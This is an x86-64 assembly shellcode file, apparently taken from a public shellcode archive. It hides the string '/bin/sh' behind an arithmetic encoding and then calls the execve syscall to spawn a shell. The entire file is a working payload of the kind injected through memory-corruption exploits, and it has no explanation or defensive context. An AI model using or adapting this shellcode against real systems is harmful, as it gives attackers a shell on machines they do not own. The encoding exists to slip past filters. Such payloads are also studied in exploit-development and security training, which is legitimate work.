; author
; http://shell-storm.org/shellcode/files/shellcode-806.php

global _start:


section .text


_start:

    ; setting rax 
    xor rax, rax 
    xor rdx, rdx
    ; setting rdi
    mov r10, 0xff978cd080858cc0 
    add r10, 0x11111111
    neg r10 
    push r10 
    push rsp
    pop rdi   
    push rdx
    push rdi
    push rsp
    pop rsi
    push 0x3b 
    pop rax 
    syscall
